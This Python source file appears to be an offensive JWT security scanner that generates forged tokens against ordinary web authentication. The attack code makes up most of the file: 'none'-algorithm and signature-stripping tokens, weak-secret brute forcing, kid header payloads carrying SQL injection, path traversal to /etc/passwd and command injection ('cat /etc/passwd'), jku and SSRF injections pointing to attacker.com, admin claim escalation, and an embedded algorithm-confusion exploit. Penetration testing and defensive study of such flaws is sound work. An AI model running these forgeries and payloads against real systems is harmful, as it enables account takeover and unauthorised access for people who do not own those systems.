"""
JWT (JSON Web Token) Attack Scanner

Comprehensive JWT security testing including:
- Algorithm confusion attacks (none, HS256/RS256 confusion)
- Key confusion attacks
- Weak secret brute forcing
- Token manipulation
- Claim tampering
- KID injection attacks
- JKU/X5U manipulation
- Token expiration bypass

Based on PortSwigger JWT research, auth0 security guidelines,
and real-world penetration testing methodologies.
"""

import base64
import hashlib
import hmac
import json
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


class JWTAttackType(Enum):
    """Types of JWT attacks."""
    NONE_ALGORITHM = "none_algorithm"
    ALG_CONFUSION = "algorithm_confusion"
    WEAK_SECRET = "weak_secret"
    KID_INJECTION = "kid_injection"
    JKU_INJECTION = "jku_injection"
    X5U_INJECTION = "x5u_injection"
    CLAIM_TAMPERING = "claim_tampering"
    SIGNATURE_STRIPPING = "signature_stripping"
    KEY_INJECTION = "key_injection"
    EXP_BYPASS = "expiration_bypass"


@dataclass
class JWTAttackResult:
    """Result of a JWT attack attempt."""
    attack_type: JWTAttackType
    original_token: str
    modified_token: str
    description: str
    success: bool = False
    severity: str = "HIGH"
    evidence: str = ""
    exploitation_notes: str = ""


class JWTScanner:
    """
    Advanced JWT security scanner.

    Features:
    - Algorithm manipulation attacks
    - Weak secret detection and brute forcing
    - Header injection attacks (kid, jku, x5u)
    - Claim tampering
    - Token forgery
    - Signature bypass techniques
    """

    def __init__(self, callback_host: str = None):
        self.callback_host = callback_host
        self.findings: List[JWTAttackResult] = []

        # Common weak secrets for brute forcing
        self.weak_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "secretkey", "secret123", "password123",
            "supersecret", "changeme", "test", "dev", "development",
            "production", "your-256-bit-secret", "your-secret-key",
            "jwt-secret", "auth-secret", "api-secret", "app-secret",
            "mysecret", "mykey", "privatekey", "qwerty", "letmein",
            "welcome", "monkey", "dragon", "master", "login",
        ]

        # Extended wordlist for thorough testing
        self.extended_secrets = self.weak_secrets + [
            f"secret{i}" for i in range(100)
        ] + [
            f"password{i}" for i in range(100)
        ] + [
            f"key{i}" for i in range(100)
        ]

    def decode_token(self, token: str) -> Tuple[Dict, Dict, str]:
        """
        Decode JWT token into header, payload, and signature.

        Args:
            token: JWT token string

        Returns:
            Tuple of (header_dict, payload_dict, signature_base64)
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")

            # Decode header
            header_b64 = parts[0]
            header_json = base64.urlsafe_b64decode(
                header_b64 + '=' * (4 - len(header_b64) % 4)
            )
            header = json.loads(header_json)

            # Decode payload
            payload_b64 = parts[1]
            payload_json = base64.urlsafe_b64decode(
                payload_b64 + '=' * (4 - len(payload_b64) % 4)
            )
            payload = json.loads(payload_json)

            return header, payload, parts[2]

        except Exception as e:
            raise ValueError(f"Failed to decode JWT: {e}")

    def encode_token(self, header: Dict, payload: Dict,
                     secret: str = "", algorithm: str = "HS256") -> str:
        """
        Encode JWT token with specified parameters.

        Args:
            header: JWT header dictionary
            payload: JWT payload dictionary
            secret: Signing secret (empty for none algorithm)
            algorithm: Signing algorithm

        Returns:
            Encoded JWT token string
        """
        # Encode header
        header_json = json.dumps(header, separators=(',', ':'))
        header_b64 = base64.urlsafe_b64encode(
            header_json.encode()
        ).rstrip(b'=').decode()

        # Encode payload
        payload_json = json.dumps(payload, separators=(',', ':'))
        payload_b64 = base64.urlsafe_b64encode(
            payload_json.encode()
        ).rstrip(b'=').decode()

        # Create signature
        message = f"{header_b64}.{payload_b64}"

        if algorithm.lower() == "none" or not secret:
            signature_b64 = ""
        elif algorithm == "HS256":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        elif algorithm == "HS384":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        elif algorithm == "HS512":
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        else:
            # For RS256/RS384/RS512, we can't sign without private key
            # Return empty signature for algorithm confusion attacks
            signature_b64 = ""

        return f"{header_b64}.{payload_b64}.{signature_b64}"

    def scan_token(self, token: str) -> List[Dict]:
        """
        Perform comprehensive JWT security scan.

        Args:
            token: JWT token to analyze

        Returns:
            List of attack findings
        """
        findings = []

        try:
            header, payload, signature = self.decode_token(token)
        except ValueError as e:
            return [{"error": str(e), "type": "parse_error"}]

        # 1. None algorithm attack
        none_result = self._test_none_algorithm(header, payload, token)
        if none_result:
            findings.append(none_result)

        # 2. Algorithm confusion (RS256 to HS256)
        if header.get("alg", "").startswith("RS"):
            confusion_result = self._test_algorithm_confusion(header, payload, token)
            if confusion_result:
                findings.append(confusion_result)

        # 3. Weak secret brute force (for HMAC algorithms)
        if header.get("alg", "").startswith("HS"):
            weak_result = self._test_weak_secret(token)
            if weak_result:
                findings.append(weak_result)

        # 4. KID injection
        kid_result = self._test_kid_injection(header, payload, token)
        if kid_result:
            findings.append(kid_result)

        # 5. JKU injection
        jku_result = self._test_jku_injection(header, payload, token)
        if jku_result:
            findings.append(jku_result)

        # 6. Claim tampering variants
        claim_results = self._generate_claim_tampers(header, payload, token)
        findings.extend(claim_results)

        # 7. Expiration bypass
        exp_result = self._test_exp_bypass(header, payload, token)
        if exp_result:
            findings.append(exp_result)

        # 8. Signature stripping
        strip_result = self._test_signature_stripping(header, payload, token)
        if strip_result:
            findings.append(strip_result)

        return findings

    def _test_none_algorithm(self, header: Dict, payload: Dict,
                            original_token: str) -> Optional[Dict]:
        """Test 'none' algorithm vulnerability."""
        # Create token with none algorithm
        none_header = header.copy()

        # Try various none algorithm variants
        none_variants = ["none", "None", "NONE", "nOnE"]

        tokens = []
        for variant in none_variants:
            none_header["alg"] = variant
            token = self.encode_token(none_header, payload, "", "none")
            tokens.append(token)

            # Also try without trailing dot
            tokens.append(token.rstrip('.'))

        return {
            "attack_type": JWTAttackType.NONE_ALGORITHM.value,
            "original_token": original_token,
            "modified_tokens": tokens,
            "description": "JWT with 'none' algorithm - signature verification bypassed",
            "severity": "CRITICAL",
            "test_instruction": "Submit these tokens and check if they're accepted",
            "exploitation": "If accepted, you can forge tokens with any claims",
            "remediation": "Explicitly reject 'none' algorithm in JWT validation",
        }

    def _test_algorithm_confusion(self, header: Dict, payload: Dict,
                                  original_token: str) -> Optional[Dict]:
        """Test RS256 to HS256 algorithm confusion."""
        if not header.get("alg", "").startswith("RS"):
            return None

        # To exploit this, we need the public key
        # Generate a template showing how to exploit
        return {
            "attack_type": JWTAttackType.ALG_CONFUSION.value,
            "original_token": original_token,
            "original_algorithm": header.get("alg"),
            "target_algorithm": "HS256",
            "description": "Algorithm confusion: sign with public key as HMAC secret",
            "severity": "CRITICAL",
            "exploitation_steps": [
                "1. Obtain the server's public key (often exposed at /jwks.json or /.well-known/jwks.json)",
                "2. Change algorithm from RS256 to HS256",
                "3. Sign the token using the public key as the HMAC secret",
                "4. Submit the forged token",
            ],
            "python_exploit": '''
import jwt
import requests

# Get public key
public_key = requests.get("https://target/.well-known/jwks.json").json()

# Forge token with public key as HMAC secret
forged = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
''',
            "remediation": "Explicitly specify allowed algorithms in JWT verification",
        }

    def _test_weak_secret(self, token: str) -> Optional[Dict]:
        """Brute force weak HMAC secrets."""
        parts = token.split('.')
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}"
        target_sig = parts[2]

        # Add padding if needed
        target_sig_padded = target_sig + '=' * (4 - len(target_sig) % 4)
        try:
            target_sig_bytes = base64.urlsafe_b64decode(target_sig_padded)
        except:
            return None

        # Determine hash based on signature length
        if len(target_sig_bytes) == 32:
            hash_func = hashlib.sha256
        elif len(target_sig_bytes) == 48:
            hash_func = hashlib.sha384
        elif len(target_sig_bytes) == 64:
            hash_func = hashlib.sha512
        else:
            return None

        # Try common secrets
        for secret in self.weak_secrets:
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hash_func
            ).digest()

            if computed == target_sig_bytes:
                return {
                    "attack_type": JWTAttackType.WEAK_SECRET.value,
                    "original_token": token,
                    "discovered_secret": secret,
                    "description": f"JWT signed with weak secret: '{secret}'",
                    "severity": "CRITICAL",
                    "exploitation": "Use this secret to forge any JWT with arbitrary claims",
                    "remediation": "Use cryptographically random secret of at least 256 bits",
                }

        return {
            "attack_type": JWTAttackType.WEAK_SECRET.value,
            "original_token": token,
            "description": "Weak secret not found in common list",
            "severity": "INFO",
            "recommendation": "Run extended brute force with larger wordlist",
            "hashcat_command": f"hashcat -m 16500 {token} wordlist.txt",
        }

    def _test_kid_injection(self, header: Dict, payload: Dict,
                           original_token: str) -> Optional[Dict]:
        """Test KID (Key ID) injection attacks."""
        # Generate various KID injection payloads

        kid_payloads = [
            # SQL injection via kid
            {"kid": "' UNION SELECT 'secret'--", "type": "sqli"},
            {"kid": "' OR 1=1--", "type": "sqli"},

            # Path traversal via kid
            {"kid": "../../../dev/null", "type": "path_traversal"},
            {"kid": "/dev/null", "type": "path_traversal"},
            {"kid": "../../../etc/passwd", "type": "path_traversal"},

            # Command injection via kid
            {"kid": "key.pem | cat /etc/passwd", "type": "command_injection"},
            {"kid": "key.pem; cat /etc/passwd", "type": "command_injection"},

            # SSRF via kid (if fetched from URL)
            {"kid": "http://localhost/admin", "type": "ssrf"},
            {"kid": f"http://{self.callback_host or 'attacker.com'}/key", "type": "ssrf"},
        ]

        injected_tokens = []
        for injection in kid_payloads:
            modified_header = header.copy()
            modified_header["kid"] = injection["kid"]

            # For path traversal to /dev/null, sign with empty string
            if injection["type"] == "path_traversal" and "null" in injection["kid"]:
                token = self.encode_token(modified_header, payload, "", "HS256")
            else:
                token = self.encode_token(modified_header, payload, "test", "HS256")

            injected_tokens.append({
                "token": token,
                "kid": injection["kid"],
                "injection_type": injection["type"]
            })

        return {
            "attack_type": JWTAttackType.KID_INJECTION.value,
            "original_token": original_token,
            "injected_tokens": injected_tokens,
            "description": "KID header injection attacks",
            "severity": "HIGH",
            "exploitation": [
                "SQLi: Extract secret from database via UNION injection",
                "Path traversal: Use /dev/null as key file (empty = valid sig with empty key)",
                "Command injection: Execute commands if kid is passed to shell",
                "SSRF: Fetch key from attacker-controlled URL",
            ],
            "remediation": "Validate kid parameter strictly, avoid dynamic file/db lookups",
        }

    def _test_jku_injection(self, header: Dict, payload: Dict,
                           original_token: str) -> Optional[Dict]:
        """Test JKU (JWK Set URL) injection."""
        if not self.callback_host:
            callback = "attacker.com"
        else:
            callback = self.callback_host

        # Create token with attacker-controlled JKU
        modified_header = header.copy()
        modified_header["jku"] = f"http://{callback}/.well-known/jwks.json"
        modified_header["alg"] = "RS256"

        return {
            "attack_type": JWTAttackType.JKU_INJECTION.value,
            "original_token": original_token,
            "description": "JKU header injection - point to attacker's JWKS",
            "severity": "CRITICAL",
            "exploitation_steps": [
                f"1. Host a JWKS file at http://{callback}/.well-known/jwks.json",
                "2. Include your public key in the JWKS",
                "3. Sign the token with your private key",
                "4. Set jku header to your JWKS URL",
                "5. Submit the token",
            ],
            "jwks_template": {
                "keys": [{
                    "kty": "RSA",
                    "kid": "attacker-key",
                    "use": "sig",
                    "n": "<your-public-key-modulus>",
                    "e": "AQAB"
                }]
            },
            "remediation": "Whitelist allowed jku URLs, validate against known issuers",
        }

    def _generate_claim_tampers(self, header: Dict, payload: Dict,
                               original_token: str) -> List[Dict]:
        """Generate claim tampering variants."""
        tampers = []

        # Common claim modifications
        modifications = [
            {"field": "sub", "value": "admin", "description": "Escalate to admin user"},
            {"field": "role", "value": "admin", "description": "Escalate role to admin"},
            {"field": "is_admin", "value": True, "description": "Set admin flag"},
            {"field": "admin", "value": True, "description": "Set admin flag"},
            {"field": "permissions", "value": ["*"], "description": "Grant all permissions"},
            {"field": "iat", "value": int(time.time()) + 86400, "description": "Future issued-at"},
        ]

        for mod in modifications:
            modified_payload = payload.copy()
            modified_payload[mod["field"]] = mod["value"]

            tampers.append({
                "attack_type": JWTAttackType.CLAIM_TAMPERING.value,
                "modification": mod,
                "description": mod["description"],
                "severity": "HIGH",
                "note": "Requires none algorithm or known secret to exploit",
            })

        return tampers

    def _test_exp_bypass(self, header: Dict, payload: Dict,
                        original_token: str) -> Optional[Dict]:
        """Test expiration bypass techniques."""
        # Remove exp claim
        no_exp_payload = {k: v for k, v in payload.items() if k != "exp"}

        # Set exp far in future
        future_exp_payload = payload.copy()
        future_exp_payload["exp"] = int(time.time()) + (10 * 365 * 24 * 60 * 60)  # 10 years

        # Set exp as string instead of int
        string_exp_payload = payload.copy()
        string_exp_payload["exp"] = "never"

        return {
            "attack_type": JWTAttackType.EXP_BYPASS.value,
            "original_token": original_token,
            "bypass_techniques": [
                {"description": "Remove exp claim entirely", "payload": no_exp_payload},
                {"description": "Set exp 10 years in future", "payload": future_exp_payload},
                {"description": "Set exp as non-integer", "payload": string_exp_payload},
            ],
            "severity": "MEDIUM",
            "note": "Requires none algorithm or known secret to forge token",
            "remediation": "Always validate exp claim exists and is valid integer",
        }

    def _test_signature_stripping(self, header: Dict, payload: Dict,
                                  original_token: str) -> Optional[Dict]:
        """Test signature stripping/truncation."""
        parts = original_token.split('.')

        stripped_variants = [
            f"{parts[0]}.{parts[1]}.",  # Empty signature
            f"{parts[0]}.{parts[1]}",   # No signature at all
            f"{parts[0]}.{parts[1]}.{'a' * 10}",  # Truncated signature
        ]

        return {
            "attack_type": JWTAttackType.SIGNATURE_STRIPPING.value,
            "original_token": original_token,
            "stripped_tokens": stripped_variants,
            "description": "Signature stripping/truncation attacks",
            "severity": "HIGH",
            "exploitation": "Some implementations may accept tokens with invalid/missing signatures",
            "remediation": "Always validate signature is present and valid",
        }

    def generate_forged_token(self, payload: Dict, secret: str = "",
                             algorithm: str = "none") -> str:
        """
        Generate a forged JWT token.

        Args:
            payload: Claims to include
            secret: Signing secret (empty for none algorithm)
            algorithm: Algorithm to use

        Returns:
            Forged JWT token
        """
        header = {"alg": algorithm, "typ": "JWT"}
        return self.encode_token(header, payload, secret, algorithm)

    def generate_attack_suite(self, sample_token: str = None) -> Dict[str, Any]:
        """Generate comprehensive JWT attack suite."""
        suite = {
            "none_algorithm_tokens": [],
            "common_secrets": self.weak_secrets,
            "kid_injections": [
                "../../../dev/null",
                "' UNION SELECT 'secret'--",
                "/proc/self/environ",
            ],
            "claim_escalations": [
                {"sub": "admin"},
                {"role": "administrator"},
                {"is_admin": True},
                {"permissions": ["*"]},
            ],
            "tools": {
                "jwt_tool": "python3 jwt_tool.py -t <token> -M at",
                "hashcat": "hashcat -m 16500 <token> wordlist.txt",
                "john": "john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256",
            },
            "remediation": [
                "Use strong, random secrets (256+ bits)",
                "Explicitly specify allowed algorithms",
                "Validate all claims (exp, iat, aud, iss)",
                "Don't expose public keys unnecessarily",
                "Sanitize kid/jku/x5u header values",
                "Use asymmetric algorithms (RS256) when possible",
                "Implement token revocation mechanism",
            ]
        }

        if sample_token:
            try:
                header, payload, _ = self.decode_token(sample_token)
                suite["decoded_sample"] = {
                    "header": header,
                    "payload": payload
                }
            except:
                pass

        return suite


def analyze_token(token: str) -> Dict:
    """Quick JWT analysis."""
    scanner = JWTScanner()
    return scanner.scan_token(token)
